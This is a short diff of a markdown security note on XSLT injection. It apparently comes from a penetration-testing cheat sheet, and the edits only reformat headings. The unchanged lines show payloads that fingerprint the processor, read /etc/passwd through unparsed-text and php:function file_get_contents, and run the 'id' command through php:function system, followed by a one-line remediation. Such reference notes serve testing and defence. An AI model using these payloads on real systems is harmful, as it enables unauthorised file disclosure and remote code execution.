@@ -29,8 +29,7 @@ Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
 ```
 
-#### LFI
-[[LFI]]
+#### [[LFI]]
 XSLT 2.0
 ```xml
 <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
@@ -40,12 +39,10 @@ XSLT 2.0
 <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
 ```
 
-##### RCE
-[[RCE]]
+##### [[RCE]]
 ```xml
 <xsl:value-of select="php:function('system','id')" />
 ```
 
-
-#### Prevention
+#### #remediation 
 Escape <, > and other symbols
